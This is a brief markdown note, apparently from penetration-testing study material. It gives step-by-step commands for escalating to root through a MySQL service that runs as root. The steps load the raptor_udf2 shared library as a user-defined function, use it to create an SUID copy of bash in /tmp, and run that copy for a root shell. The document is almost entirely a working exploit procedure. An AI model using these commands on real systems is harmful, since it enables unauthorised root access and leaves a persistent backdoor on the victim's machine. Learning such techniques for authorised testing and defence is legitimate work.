# MySQL Service Exploit

##  Run system commands as root via the MySQL service

### Info
- MySql Service running as root needed
- Exploit: https://www.exploit-db.com/exploits/1518

### Steps

1. Connect to the MySQL service as the root user
2. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
	
	```
	use mysql;  
	create table foo(line blob);  
	insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
	select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
	create function do_system returns integer soname 'raptor_udf2.so';
	```

3. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission

	```
	select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
	```
	
4. Exit out of the MySQL shell and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

	```
	/tmp/rootbash -p
	```